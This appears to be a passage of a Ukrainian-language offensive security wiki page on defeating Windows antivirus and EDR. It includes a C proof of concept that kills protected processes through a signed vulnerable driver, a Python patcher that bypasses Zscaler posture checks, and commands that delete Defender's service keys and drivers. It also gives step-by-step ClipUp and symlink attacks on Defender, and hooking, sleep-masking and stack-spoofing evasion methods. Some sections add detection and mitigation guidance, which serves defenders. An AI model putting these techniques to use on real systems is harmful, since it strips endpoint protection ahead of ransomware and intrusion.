Storm-2603 використала невелику консольну утиліту під назвою **Antivirus Terminator**, щоб вимкнути захист кінцевих точок перед розгортанням ransomware. Інструмент постачається зі **своїм уразливим, але *підписаним* драйвером** і зловживає ним для виконання привілейованих операцій ядра, яким не можуть завадити навіть AV-служби Protected-Process-Light (PPL).<sup>[[12]](#references)</sup>

Основні висновки
1. **Підписаний драйвер**: файл, який записується на диск, — це `ServiceMouse.sys`, але насправді це легітимно підписаний драйвер `AToolsKrnl64.sys` з «System In-Depth Analysis Toolkit» від Antiy Labs. Оскільки драйвер має дійсний підпис Microsoft, він завантажується, навіть коли ввімкнено Driver-Signature-Enforcement (DSE).
2. **Встановлення служби**:
   ```powershell
   sc create ServiceMouse type= kernel binPath= "C:\Windows\System32\drivers\ServiceMouse.sys"
   sc start  ServiceMouse
   ```
   Перший рядок реєструє драйвер як **службу ядра**, а другий запускає його, щоб `\\.\ServiceMouse` став доступним із користувацького простору.
3. **IOCTL-коди, доступні через драйвер**
   | IOCTL code | Можливість                             |
   |-----------:|-----------------------------------------|
   | `0x99000050` | Завершення довільного процесу за PID (використовується для завершення служб Defender/EDR) |
   | `0x990000D0` | Видалення довільного файлу з диска |
   | `0x990001D0` | Вивантаження драйвера та видалення служби |

   Мінімальний proof-of-concept на C:
   ```c
   #include <windows.h>
   
   int main(int argc, char **argv){
       DWORD pid = strtoul(argv[1], NULL, 10);
       HANDLE hDrv = CreateFileA("\\\\.\\ServiceMouse", GENERIC_READ|GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
       DeviceIoControl(hDrv, 0x99000050, &pid, sizeof(pid), NULL, 0, NULL, NULL);
       CloseHandle(hDrv);
       return 0;
   }
   ```
4. **Чому це працює**: BYOVD повністю обходить захисти user-mode; код, що виконується в kernel, може відкривати *захищені* процеси, завершувати їх або втручатися в об’єкти kernel незалежно від PPL/PP, ELAM та інших функцій hardening.

Виявлення / пом’якшення ризику
•  Увімкніть список заблокованих вразливих драйверів Microsoft (`HVCI`, `Smart App Control`), щоб Windows відмовлялася завантажувати `AToolsKrnl64.sys`.
•  Відстежуйте створення нових служб *kernel* і сповіщайте про завантаження драйвера з каталогу, доступного для запису всім користувачам, або драйвера, відсутнього в списку дозволених.
•  Відстежуйте відкриття дескрипторів до користувацьких об’єктів пристроїв із user-mode, за якими йдуть підозрілі виклики `DeviceIoControl`.

### Обхід перевірок стану пристрою Zscaler Client Connector за допомогою виправлення бінарних файлів на диску

**Client Connector** від Zscaler застосовує правила стану пристрою локально та покладається на Windows RPC для передавання результатів іншим компонентам. Два слабкі рішення в дизайні уможливлюють повний обхід:

1. Перевірка стану пристрою відбувається **повністю на стороні клієнта** (на сервер надсилається булеве значення).
2. Внутрішні кінцеві точки RPC перевіряють лише те, чи **підписаний Zscaler** виконуваний файл, що підключається (за допомогою `WinVerifyTrust`).<sup>[[11]](#references)</sup>

**Виправивши чотири підписані бінарні файли на диску**, можна нейтралізувати обидва механізми:

| Бінарний файл | Вихідна логіка, яку виправлено | Результат |
|--------|------------------------|---------|
| `ZSATrayManager.exe` | `devicePostureCheck() → return 0/1` | Завжди повертає `1`, тому кожна перевірка вважається успішною |
| `ZSAService.exe` | Непрямий виклик `WinVerifyTrust` | NOP-нуто ⇒ будь-який процес (навіть непідписаний) може підключатися до RPC pipes |
| `ZSATrayHelper.dll` | `verifyZSAServiceFileSignature()` | Замінено на `mov eax,1 ; ret` |
| `ZSATunnel.exe` | Перевірки цілісності тунелю | Передчасно пропускаються |

Фрагмент мінімального патчера:

```python
pattern = bytes.fromhex("44 89 AC 24 80 02 00 00")
replacement = bytes.fromhex("C6 84 24 80 02 00 00 01")  # force result = 1

with open("ZSATrayManager.exe", "r+b") as f:
    data = f.read()
    off = data.find(pattern)
    if off == -1:
        print("pattern not found")
    else:
        f.seek(off)
        f.write(replacement)
```

Після заміни оригінальних файлів і перезапуску стека служб:

* **Усі** перевірки стану відображаються **зеленими/відповідними вимогам**.
* Непідписані або змінені бінарні файли можуть відкривати кінцеві точки RPC іменованих каналів (наприклад, `\\RPC Control\\ZSATrayManager_talk_to_me`).
* Скомпрометований хост отримує необмежений доступ до внутрішньої мережі, визначеної політиками Zscaler.

Цей приклад показує, як кілька байтових патчів можуть обійти рішення про довіру, що ухвалюються виключно на стороні клієнта, та прості перевірки підписів.

## Зловживання довіреною функціональністю Microsoft Defender `BTR.sys`

Драйвер **Boot-Time Removal** у Defender — корисний контрприклад класичному BYOVD. `BTR.sys` — легітимний компонент для виправлення системи, підписаний Microsoft, без помилки пошкодження пам’яті та інтерфейсу IOCTL; натомість, отримавши права адміністратора та `SeLoadDriverPrivilege`, оператор може підробити приватну транзакцію виправлення й отримати передбачені операції з файлами та реєстром на рівні Ring-0. Це **примітив нейтралізації AV/EDR після компрометації, а не початкового доступу чи підвищення привілеїв**. Драйвер можна видобути з ресурсу `BOOTTIMETOOL` у власному `MpEngine.dll` цільової системи, а не імпортувати помітний драйвер стороннього виробника.<sup>[[36]](#references)</sup>

### Підготовка одноразового драйвера

Зазвичай Defender зберігає ресурс у файлі з випадковою назвою `[a-z]{8}.sys` і реєструє службу ядра з подібною назвою. `DriverEntry` читає значення `Args` служби, відкриває вказаний альтернативний потік даних NTFS (ADS), розшифровує та перевіряє список дій, записує дані зворотного зв’язку й повертає `0xC0000056` (`STATUS_DELETE_PENDING`) після успішного виконання, щоб драйвер вивантажився, а не залишався резидентним. Підроблена служба має такі характерні значення.<sup>[[36]](#references)[[37]](#references)</sup>

```text
Type         = 1
Start        = 1
ErrorControl = 0
ImagePath    = \??\C:\Windows\System32\drivers\<random>.sys
Group        = Boot Bus Extender
Args         = C:\Windows\System32\drivers\<random>.sys:changelist
```

Потік `:changelist` містить один зашифрований RC4 blob. В аналізованих збірках повторно використовується фіксований ключ довжиною 256 байтів, тому шифрування не є межею авторизації. Коректний plaintext містить глобальний заголовок довжиною 24 байти (`Magic=0xFEE1DEAD`, `Version=2`, `PayloadOffset=0x10`, CRC заголовка та ID транзакції, обчислений на основі payload), за яким ідуть шлях feedback у UTF-16 із завершальним нульовим символом і будь-яка кількість елементів. Кожен елемент має заголовок довжиною 16 байтів (`DataSize`, `Action`, `HeaderCRC`, `DataCRC`) і дані, специфічні для дії, що закінчуються **рівно чотирма нульовими байтами**. Для кожної області заголовка/даних окремо перевіряється CRC-32 з поліномом `0xEDB88320`, початковим станом `0xFFFFFFFF` і **без фінального XOR** (`~CRC32`); стан CRC скидається для кожної області.<sup>[[36]](#references)[[37]](#references)</sup>

Прийняті ID дій відкривають доступ до таких примітивів ядра.<sup>[[36]](#references)[[37]](#references)</sup>

| ID | Дані елемента | Результат |
| --- | --- | --- |
| 1 | `[UTF-16 path]` | Видалення файла, зокрема заблокованого |
| 2 | `[UTF-16 path]` | Видалення порожньої директорії |
| 3 | `[Flags][source][destination]` | Переміщення файла до захищеного шляху, вибраного атакувальником; порожнє призначення означає видалення |
| 4 | `[Flags][key path]` | Рекурсивне видалення ключа реєстру |
| 5 | `[Flags][key path + "\\" + value]` | Видалення значення реєстру |
| 6 | `[Flags][type][size][key path + "\\" + value][data]` | Створення/оновлення значення реєстру та створення відсутніх шляхів до ключа |

Для дій 5 і 6 роздільник ключа/значення у форматі передавання — **дві зворотні скісні риски поспіль**; шлях у звичному форматі не буде розділено належним чином. Файл feedback здебільшого віддзеркалює запит, але перші чотири байти даних кожного елемента стають його результуючим `NTSTATUS`. Для дій 1 і 2, які не мають початкового поля flags, BTR зсуває шлях у чотири зарезервовані кінцеві байти, щоб звільнити місце для цього статусу.<sup>[[36]](#references)</sup>

### Робочий процес `BTR_CLI` і вікно раннього завантаження

[`BTR_CLI`](https://github.com/Dump-GUY/BTR_CLI) реалізує весь ланцюжок: витягує `BTR.sys` із локального Defender, створює `<random>.sys:changelist` і потік feedback, серіалізує/перевіряє контрольні суми/шифрує ланцюжок дій, безпосередньо створює ключ реєстру служби, а потім викликає `NtLoadDriver` для `-trigger now` або залишає драйвер для запуску під час старту системи з `-trigger boot`. Пряме налаштування реєстру обходить звичайний шлях SCM `CreateServiceW`, тому **не створює** подію встановлення служби з ID 7045. Артефакти, створені для запуску під час завантаження, згодом можна видалити командою `BTR_CLI.exe -cleanup <service_name>`.<sup>[[36]](#references)[[37]](#references)</sup>

```powershell
# Runtime: remove protected security-service registrations from Ring 0
BTR_CLI.exe -chain -item "4|HKLM\SYSTEM\CurrentControlSet\Services\WdFilter" -item "4|HKLM\SYSTEM\CurrentControlSet\Services\WinDefend" -trigger now

# Boot: delete a security driver before its user-mode protection stack starts
BTR_CLI.exe -a 1 -s "C:\Windows\System32\drivers\wd\WdFilter.sys" -trigger boot
```

`Start=0` непридатний, оскільки BTR виконує файлові операції з `DriverEntry` до готовності стека сховища та посилання `SystemRoot`. `Start=1` разом із групою високого пріоритету `Boot Bus Extender` натомість запускає драйвер на Phase 1: NTFS уже доступна, але багато драйверів безпеки з типом запуску system-start і служб EDR у user mode ще не ініціалізовані. Фільтри з типом запуску boot-start, як-от `WdFilter`, можуть уже бути завантажені, однак BTR може видалити їхні бінарні файли або конфігурацію служб до наступного запуску, а також видалити виконувані файли служб до їх запуску SCM. ELAM не усуває цю прогалину, оскільки BTR запускається після оцінювання boot-start і має дійсний підпис Microsoft.<sup>[[36]](#references)</sup>

Кілька дій виконуються в одній транзакції. PoC додає на початок Action 1 для жорстко заданого шляху `\SystemRoot\Temp\BootClean.log`: BTR створює цей журнал, потім обробляє власний запит на видалення та видаляє його перед вивантаженням. Це зменшує кількість доказів, а зберігання зворотного зв’язку в `<random>.sys:<random>.dat` дає змогу видалити драйвер і обидва потоки разом.<sup>[[36]](#references)[[37]](#references)</sup>

### Кореляції з високою інформативністю для виявлення

Правила, що ґрунтуються лише на підписах, і список заблокованих вразливих драйверів Microsoft не протидіють зловживанню передбаченою функціональністю BTR. Надавайте перевагу наведеним нижче поведінковим кореляціям, водночас відрізняючи легітимне походження від Defender від запуску довільним процесом.<sup>[[36]](#references)</sup>

- **Sysmon 15:** створення `.sys:changelist` є універсальною ознакою підготовки BTR. ADS `.dat`, приєднаний до того самого `.sys`, особливо підозрілий, оскільки легітимний Defender зазвичай зберігає зворотний зв’язок у `C:\ProgramData\Microsoft\Windows Defender\Scans\RebootActions\`.
- **Sysmon 12/13 без System 7045:** корелюйте пряме створення `HKLM\SYSTEM\CurrentControlSet\Services\<random>`, що містить `Args=...:changelist` і `Group=Boot Bus Extender`, за відсутності відповідної події встановлення SCM.
- **Sysmon 6 -> 23:** корелюйте завантаження відомого драйвера BTR з походження, не пов’язаного з Defender, із подальшим видаленням файлу, атрибутованим до `System`/PID 4, особливо якщо йдеться про бінарні файли засобів безпеки.
- **Sysmon 11 -> 23:** сповіщайте про швидке створення та видалення `\SystemRoot\Temp\BootClean.log` процесом `System`/PID 4.
- Обмежуйте та аудіюйте призначення/увімкнення `SeLoadDriverPrivilege`; одного лише підпису Microsoft недостатньо для довіри, якщо драйвер засобу безпеки підготовлено через `cmd.exe`, PowerShell або невідомий процес.

## Зловживання Protected Process Light (PPL) для втручання в AV/EDR за допомогою LOLBINs

Protected Process Light (PPL) забезпечує ієрархію підписантів/рівнів, щоб лише захищені процеси з таким самим або вищим рівнем могли втручатися один в одного. Зловмисник, який може легітимно запустити бінарний файл із підтримкою PPL і контролювати його аргументи, може використати нешкідливу функціональність (наприклад, журналювання) як обмежений примітив запису з підтримкою PPL у захищені каталоги, які використовує AV/EDR.<sup>[[16]](#references)[[17]](#references)[[18]](#references)[[19]](#references)[[20]](#references)</sup>

Що потрібно, щоб процес працював як PPL
- Цільовий EXE (і всі завантажені DLL) мають бути підписані EKU, сумісним із PPL.
- Процес потрібно створити за допомогою CreateProcess із прапорцями: `EXTENDED_STARTUPINFO_PRESENT | CREATE_PROTECTED_PROCESS`.
- Потрібно запросити сумісний рівень захисту, що відповідає підписанту бінарного файлу (наприклад, `PROTECTION_LEVEL_ANTIMALWARE_LIGHT` для підписантів anti-malware, `PROTECTION_LEVEL_WINDOWS` для підписантів Windows). Неправильні рівні призведуть до помилки створення.

Див. також ширший вступ до PP/PPL і захисту LSASS:

{{#ref}}
stealing-credentials/credentials-protections.md
{{#endref}}

Інструменти для запуску
- Допоміжний інструмент із відкритим вихідним кодом: CreateProcessAsPPL (вибирає рівень захисту та передає аргументи цільовому EXE):
  - [https://github.com/2x7EQ13/CreateProcessAsPPL](https://github.com/2x7EQ13/CreateProcessAsPPL)<sup>[[19]](#references)</sup>
- Шаблон використання:

```text
CreateProcessAsPPL.exe <level 0..4> <path-to-ppl-capable-exe> [args...]
# example: spawn a Windows-signed component at PPL level 1 (Windows)
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe <args>
# example: spawn an anti-malware signed component at level 3
CreateProcessAsPPL.exe 3 <anti-malware-signed-exe> <args>
```

Примітив LOLBIN: ClipUp.exe
- Підписаний системний бінарний файл `C:\Windows\System32\ClipUp.exe` запускає себе та приймає параметр для запису файлу журналу за вказаним викликачем шляхом.
- Якщо його запустити як процес PPL, запис файлу виконується з підтримкою PPL.
- ClipUp не може обробляти шляхи, що містять пробіли; використовуйте короткі шляхи 8.3, щоб указати на зазвичай захищені розташування.

Допоміжні засоби для коротких шляхів 8.3
- Переглянути короткі імена: `dir /x` у кожному батьківському каталозі.
- Отримати короткий шлях у cmd: `for %A in ("C:\ProgramData\Microsoft\Windows Defender\Platform") do @echo %~sA`

Ланцюжок зловживання (абстрактно)
1) Запустіть LOLBIN із підтримкою PPL (ClipUp) із `CREATE_PROTECTED_PROCESS`, використовуючи засіб запуску (наприклад, CreateProcessAsPPL).
2) Передайте аргумент шляху до журналу ClipUp, щоб примусово створити файл у захищеному каталозі AV (наприклад, Defender Platform). За потреби використовуйте короткі імена 8.3.
3) Якщо AV зазвичай відкриває/блокує цільовий бінарний файл під час роботи (наприклад, MsMpEng.exe), заплануйте запис під час завантаження системи, до запуску AV, установивши службу автоматичного запуску, яка гарантовано запускається раніше. Перевірте порядок завантаження за допомогою Process Monitor (журналювання завантаження).
4) Після перезавантаження запис із підтримкою PPL виконується до того, як AV заблокує свої бінарні файли, пошкоджуючи цільовий файл і перешкоджаючи запуску.

Приклад виклику (шляхи приховано/скорочено з міркувань безпеки):

```text
# Run ClipUp as PPL at Windows signer level (1) and point its log to a protected folder using 8.3 names
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe -ppl C:\PROGRA~3\MICROS~1\WINDOW~1\Platform\<ver>\samplew.dll
```

Примітки та обмеження
- Ви не можете контролювати вміст, який записує ClipUp, — лише місце розташування; цей примітив підходить для пошкодження, а не для точного впровадження вмісту.
- Для встановлення/запуску служби потрібні локальні права адміністратора/SYSTEM і можливість перезавантаження.
- Час має вирішальне значення: цільовий файл не має бути відкритим; виконання під час завантаження дає змогу уникнути блокувань файлів.

Виявлення
- Створення процесу `ClipUp.exe` з незвичними аргументами, особливо якщо батьківським процесом є нестандартний засіб запуску, під час завантаження або близько до нього.
- Нові служби, налаштовані на автоматичний запуск підозрілих бінарних файлів і стабільно запускаються раніше за Defender/AV. Перевіряйте створення/зміну служб перед збоями запуску Defender.
- Моніторинг цілісності файлів у каталогах Defender/Platform; неочікуване створення/зміна файлів процесами з прапорцями захищеного процесу.
- Телеметрія ETW/EDR: шукайте процеси, створені з `CREATE_PROTECTED_PROCESS`, і аномальне використання рівня PPL процесами, не пов’язаними з AV.

Заходи пом’якшення
- WDAC/Code Integrity: обмежте, які підписані бінарні файли можуть виконуватися як PPL і від яких батьківських процесів; блокуйте запуск ClipUp поза легітимними сценаріями.
- Гігієна служб: обмежте створення/зміну служб з автоматичним запуском і відстежуйте маніпуляції порядком запуску.
- Переконайтеся, що захист Defender від втручання та захист на ранньому етапі завантаження ввімкнено; перевіряйте помилки запуску, що вказують на пошкодження бінарних файлів.
- Якщо це сумісно з вашим середовищем, розгляньте можливість вимкнення генерації коротких імен 8.3 на томах, де розміщені засоби безпеки (ретельно протестуйте).

## Втручання в Microsoft Defender через перехоплення символічного посилання на каталог версії платформи

Windows Defender визначає платформу для запуску, перелічуючи підкаталоги в:
- `C:\ProgramData\Microsoft\Windows Defender\Platform\`

Він вибирає підкаталог із версією, що має найвище лексикографічне значення (наприклад, `4.18.25070.5-0`), а потім запускає звідти процеси служби Defender (відповідно оновлюючи шляхи служби/реєстру). Цей вибір довіряє записам каталогів, зокрема точкам повторної обробки каталогів (символічним посиланням). Адміністратор може скористатися цим, щоб перенаправити Defender до шляху, доступного для запису зловмиснику, і виконати DLL sideloading або порушити роботу служби.<sup>[[21]](#references)[[22]](#references)</sup>

Передумови
- Локальний адміністратор (потрібен для створення каталогів/символічних посилань у каталозі Platform)
- Можливість перезавантажити систему або запустити повторний вибір платформи Defender (перезапуск служби під час завантаження)
- Потрібні лише вбудовані інструменти (mklink)

Чому це працює
- Defender блокує запис у власні каталоги, але під час вибору платформи довіряє записам каталогів і вибирає версію з найвищим лексикографічним значенням, не перевіряючи, чи веде ціль до захищеного/довіреного шляху.

Покроково (приклад)
1) Підготуйте доступну для запису копію поточного каталогу платформи, наприклад `C:\TMP\AV`:
```cmd
set SRC="C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.25070.5-0"
set DST="C:\TMP\AV"
robocopy %SRC% %DST% /MIR
```
2) Створіть symlink на каталог із вищою версією всередині Platform, що вказує на вашу теку:
```cmd
mklink /D "C:\ProgramData\Microsoft\Windows Defender\Platform\5.18.25070.5-0" "C:\TMP\AV"
```
3) Вибір тригера (рекомендується перезавантаження):
```cmd
shutdown /r /t 0
```
4) Переконайтеся, що MsMpEng.exe (WinDefend) запускається з перенаправленого шляху:
```powershell
Get-Process MsMpEng | Select-Object Id,Path
# or
wmic process where name='MsMpEng.exe' get ProcessId,ExecutablePath
```
Слід перевірити новий шлях процесу в `C:\TMP\AV\` і переконатися, що конфігурація служби та реєстр указують на це розташування.

Варіанти post-exploitation
- DLL sideloading/code execution: розмістіть або замініть DLL, які Defender завантажує з каталогу своєї програми, щоб виконати код у процесах Defender. Див. розділ вище: [DLL Sideloading & Proxying](#dll-sideloading--proxying).
- Зупинка служби/відмова в обслуговуванні: видаліть symlink версії, щоб під час наступного запуску налаштований шлях не вказував на потрібне розташування й Defender не зміг запуститися:
```cmd
rmdir "C:\ProgramData\Microsoft\Windows Defender\Platform\5.18.25070.5-0"
```

> [!TIP]
> Зауважте, що ця техніка сама по собі не забезпечує підвищення привілеїв; для неї потрібні права адміністратора.

## API/IAT Hooking + Call-Stack Spoofing with PIC (Crystal Kit-style)

Команди Red team можуть перенести runtime evasion з імпланта C2 безпосередньо до цільового модуля, перехопивши його Import Address Table (IAT) і спрямовуючи вибрані API через контрольований зловмисником позиційно-незалежний код (PIC). Це дає змогу застосовувати evasion до ширшого набору API, ніж той, який доступний у багатьох kits (наприклад, CreateProcessA), а також поширює такий самий захист на BOFs і DLL для post-exploitation.<sup>[[3]](#references)[[4]](#references)[[5]](#references)</sup>

Підхід високого рівня
- Розмістіть PIC blob поруч із цільовим модулем за допомогою reflective loader (додаючи його на початку або як супровідний файл). PIC має бути самодостатнім і позиційно-незалежним.
- Під час завантаження host DLL перегляньте його IMAGE_IMPORT_DESCRIPTOR і змініть записи IAT для цільових імпортів (наприклад, CreateProcessA/W, CreateThread, LoadLibraryA/W, VirtualAlloc), щоб вони вказували на тонкі PIC wrappers.
- Кожен PIC wrapper виконує evasion перед викликом справжньої адреси API наприкінці. Типові методи evasion:
  - Маскування/зняття маскування пам’яті навколо виклику (наприклад, шифрування областей beacon, RWX→RX, зміна назв сторінок/дозволів), а потім відновлення після виклику.
  - Call-stack spoofing: створення безпечного стека й перехід до цільового API, щоб аналіз call stack визначав очікувані фрейми.<sup>[[9]](#references)</sup>
- Для сумісності експортуйте інтерфейс, щоб скрипт Aggressor (або еквівалент) міг реєструвати API для перехоплення в Beacon, BOFs і DLL для post-exploitation.

Чому тут використовується IAT hooking
- Працює з будь-яким кодом, який використовує перехоплений імпорт, без модифікації коду інструмента та без потреби в тому, щоб Beacon проксіював конкретні API.
- Охоплює DLL для post-exploitation: перехоплення LoadLibrary* дає змогу перехоплювати завантаження модулів (наприклад, System.Management.Automation.dll, clr.dll) і застосовувати таке саме маскування та call-stack evasion до їхніх викликів API.
- Відновлює надійне використання команд post-ex, що запускають процеси, проти виявлення на основі call stack — за допомогою обгорток для CreateProcessA/W.

Мінімальний приклад IAT hook (псевдокод x64 C/C++)
```c
// For each IMAGE_IMPORT_DESCRIPTOR
//  For each thunk in the IAT
//    if imported function == "CreateProcessA"
//       WriteProcessMemory(local): IAT[idx] = (ULONG_PTR)Pic_CreateProcessA_Wrapper;
// Wrapper performs: mask(); stack_spoof_call(real_CreateProcessA, args...); unmask();
```
Нотатки
- Застосовуйте патч після релокацій/ASLR і до першого використання імпорту. Reflective loaders, як-от TitanLdr/AceLdr, демонструють hooking під час DllMain завантаженого модуля.
- Робіть wrappers компактними й PIC-safe; визначайте справжній API через оригінальне значення IAT, збережене до patching, або через LdrGetProcedureAddress.
- Для PIC використовуйте переходи RW → RX та не залишайте сторінки одночасно writable+executable.

Stub для call-stack spoofing
- PIC stubs у стилі Draugr створюють фальшивий call chain (return addresses у benign modules), а потім передають керування справжньому API.
- Це обходить виявлення, яке очікує канонічні стеки від Beacon/BOFs під час викликів чутливих API.
- Поєднуйте це з техніками stack cutting/stack stitching, щоб потрапити в очікувані frames перед прологом API.

Операційна інтеграція
- Додавайте reflective loader на початок post-ex DLLs, щоб PIC і hooks автоматично ініціалізувалися під час завантаження DLL.
- Використовуйте Aggressor script для реєстрації цільових API, щоб Beacon і BOFs прозоро користувалися тим самим шляхом ухилення без змін коду.

Міркування щодо виявлення/DFIR
- Цілісність IAT: записи, що вказують на адреси поза image (heap/anon); періодична перевірка import pointers.
- Аномалії стека: return addresses, що не належать завантаженим images; раптові переходи до non-image PIC; неузгоджена ancestry RtlUserThreadStart.
- Телеметрія loader: записи в IAT зсередини процесу, активність DllMain на ранньому етапі, що змінює import thunks, неочікувані RX regions, створені під час завантаження.
- Ухилення від image-load telemetry: якщо ви hook-ите LoadLibrary*, відстежуйте підозрілі завантаження automation/clr assemblies, пов’язані з подіями masking пам’яті.

Пов’язані building blocks і приклади
- Reflective loaders, що виконують IAT patching під час завантаження (наприклад, TitanLdr, AceLdr)
- Hooks для memory masking (наприклад, simplehook) і PIC для stack-cutting (stackcutting)
- PIC stubs для call-stack spoofing (наприклад, Draugr)


## Import-Time IAT Hooking + Sleep Obfuscation (Crystal Palace/PICO)

### Import-time IAT hooks через resident PICO

Якщо ви контролюєте reflective loader, можна hook-ити імпорти **під час** `ProcessImports()`, замінивши вказівник loader-а `GetProcAddress` на власний resolver, який спочатку перевіряє hooks:<sup>[[6]](#references)[[7]](#references)[[8]](#references)</sup>

- Створіть **resident PICO** (persistent PIC object), який зберігається після того, як transient loader PIC звільнить пам’ять.
- Експортуйте функцію `setup_hooks()`, яка перезаписує import resolver loader-а (наприклад, `funcs.GetProcAddress = _GetProcAddress`).
- У `_GetProcAddress` пропускайте ordinal imports і використовуйте hash-based пошук hooks, наприклад `__resolve_hook(ror13hash(name))`. Якщо hook знайдено, повертайте його; інакше передавайте виклик справжньому `GetProcAddress`.
- Реєструйте цільові hooks під час link time за допомогою записів Crystal Palace `addhook "MODULE$Func" "hook"`. Hook залишається доступним, оскільки розміщений усередині resident PICO.

У результаті виконується **import-time IAT redirection** без patching code section завантаженої DLL після її завантаження.

### Примусове створення hookable imports, коли ціль використовує PEB-walking

Import-time hooks спрацьовують, лише якщо функція справді присутня в IAT цілі. Якщо модуль визначає API через PEB-walk + hash (без import entry), створіть справжній імпорт, щоб шлях `ProcessImports()` loader-а міг його обробити:

- Замініть hashed export resolution (наприклад, `GetSymbolAddress(..., HASH_FUNC_WAIT_FOR_SINGLE_OBJECT)`) на пряме посилання на кшталт `&WaitForSingleObject`.
- Компілятор створить запис IAT, що дасть змогу перехопити виклик під час розв’язання імпортів reflective loader-ом.

### Sleep/idle obfuscation у стилі Ekko без patching `Sleep()`

Замість patching `Sleep` hook-іть **фактичні wait/IPC primitives**, які використовує implant (`WaitForSingleObject(Ex)`, `WaitForMultipleObjects`, `ConnectNamedPipe`). Для тривалого очікування обгорніть виклик у ланцюг obfuscation у стилі Ekko, який шифрує image у пам’яті під час простою:<sup>[[31]](#references)[[27]](#references)</sup>

- Використовуйте `CreateTimerQueueTimer`, щоб запланувати послідовність callbacks, які викликають `NtContinue` із підготовленими `CONTEXT` frames.
- Типовий ланцюг (x64): встановити для image `PAGE_READWRITE` → виконати RC4-шифрування через `advapi32!SystemFunction032` над усім mapped image → виконати блокувальне очікування → розшифрувати RC4 → **відновити дозволи для кожної секції**, пройшовши PE sections → подати сигнал про завершення.
- `RtlCaptureContext` надає шаблон `CONTEXT`; клонуйте його в кілька frames і встановіть registers (`Rip/Rcx/Rdx/R8/R9`), щоб виконати кожен крок.

Операційна деталь: повертайте «success» для тривалих очікувань (наприклад, `WAIT_OBJECT_0`), щоб викликач продовжив роботу, поки image замаскований. Такий підхід приховує модуль від сканерів у періоди простою та уникає типової сигнатури «patched `Sleep()`».

Ідеї для виявлення (на основі телеметрії)
- Серії callbacks `CreateTimerQueueTimer`, що вказують на `NtContinue`.
- Використання `advapi32!SystemFunction032` для великих суміжних буферів розміром із image.
- `VirtualProtect` для великого діапазону з подальшим відновленням дозволів для окремих секцій.

### Runtime CFG registration для sleep-obfuscation gadgets

У цілях із CFG перший непрямий перехід до mid-function gadget, наприклад `jmp [rbx]` або `jmp rdi`, зазвичай аварійно завершує процес із `STATUS_STACK_BUFFER_OVERRUN`, оскільки gadget відсутній у CFG metadata модуля. Щоб ланцюги у стилі Ekko/Kraken працювали в захищених процесах:<sup>[[30]](#references)</sup>

- Реєструйте кожну непряму ціль, яку використовує ланцюг, через `NtSetInformationVirtualMemory(..., VmCfgCallTargetInformation, ...)` і записи `CFG_CALL_TARGET_VALID`.
- Для адрес усередині завантажених images (`ntdll`, `kernel32`, `advapi32`) `MEMORY_RANGE_ENTRY` має починатися з **базової адреси image** і охоплювати **весь розмір image**.
- Для вручну mapped/PIC/stomped regions використовуйте **базову адресу allocation** і його розмір.
- Позначайте не лише dispatch gadget, а й exports, до яких переходять непрямо (`NtContinue`, `SystemFunction032`, `VirtualProtect`, `GetThreadContext`, `SetThreadContext`, wait/event syscalls), а також будь-які executable sections під контролем атакувальника, що стануть непрямими цілями.

Це перетворює sleep chains у стилі ROP/JOP із «працює лише в процесах без CFG» на багаторазово використовуваний primitive для `explorer.exe`, браузерів, `svchost.exe` та інших endpoints, скомпільованих із `/guard:cf`.

### CET-safe stack spoofing для потоків у стані сну

Повна заміна `CONTEXT` створює помітний шум і може не працювати в системах із CET Shadow Stack, оскільки підроблений `Rip` має узгоджуватися з апаратним shadow stack. Безпечніший підхід до sleep-masking:<sup>[[30]](#references)</sup>

- Виберіть інший потік у тому самому процесі та прочитайте межі його стека `NT_TIB` / TEB (`StackBase`, `StackLimit`) через `NtQueryInformationThread`.
- Збережіть оригінальні TEB/TIB поточного потоку.
- Зафіксуйте справжній контекст потоку в стані сну за допомогою `GetThreadContext`.
- Скопіюйте в контекст spoof лише справжній `Rip`, залишивши підробленими `Rsp`/стан стека.
- Під час періоду сну скопіюйте `NT_TIB` spoof-потоку в TEB поточного потоку, щоб stack walkers виконували unwind у межах легітимного діапазону стека.
- Після завершення очікування відновіть оригінальні TIB і контекст потоку.

Це зберігає instruction pointer, узгоджений із CET, водночас вводячи в оману EDR stack walkers, які покладаються на метадані стека TEB для перевірки unwind.

### Альтернатива на основі APC: Kraken Mask

Якщо dispatch через timer queue надто помітний за сигнатурою, ту саму послідовність sleep-encrypt-spoof-restore можна виконати з призупиненого допоміжного потоку за допомогою queued APCs:<sup>[[27]](#references)</sup>

- Створіть допоміжний потік з `NtTestAlert` як entrypoint.
- Поставте підготовлені `CONTEXT` frames/APCs у чергу через `NtQueueApcThread` і виконайте їх через `NtAlertResumeThread`.
- Зберігайте стан ланцюга в heap, а не в стеку допоміжного потоку, щоб не вичерпати стандартний стек потоку розміром 64 KB.
- Використовуйте `NtSignalAndWaitForSingleObject`, щоб атомарно подати сигнал про початок і заблокувати потік.
- Призупиніть основний потік перед відновленням TIB/контексту (`NtSuspendThread` → restore → `NtResumeThread`), щоб зменшити проміжок гонки, у якому сканер може побачити частково відновлений стек.

Це замінює сигнатуру `CreateTimerQueueTimer` + `NtContinue` на сигнатуру helper-thread/APC, зберігаючи ті самі цілі RC4 masking і stack-spoofing.

Додаткові ідеї для виявлення
- `NtSetInformationVirtualMemory` із `VmCfgCallTargetInformation` незадовго до sleep, очікування або APC dispatch.
- `GetThreadContext`/`SetThreadContext`, викликані навколо `WaitForSingleObject(Ex)`, `NtWaitForSingleObject`, `NtSignalAndWaitForSingleObject` або `ConnectNamedPipe`.
- `NtQueryInformationThread`, після якого виконуються прямі записи в межі стека TEB/TIB поточного потоку.
- Ланцюги `NtQueueApcThread`/`NtAlertResumeThread`, що непрямо викликають `SystemFunction032`, `VirtualProtect` або helpers відновлення дозволів секцій.
- Повторне використання коротких gadget signatures на кшталт `FF 23` (`jmp [rbx]`) або `FF E7` (`jmp rdi`) як dispatch pivots усередині підписаних модулів.


## Precision Module Stomping

Module stomping виконує payloads із **секції `.text` DLL, уже mapped у цільовому процесі**, замість виділення очевидної private executable memory або завантаження нової sacrificial DLL. Ціллю для перезапису має бути **завантажений, disk-backed image**, code space якого вмістить payload без пошкодження шляхів виконання, потрібних процесу.<sup>[[1]](#references)[[2]](#references)</sup>

### Надійний вибір цілі

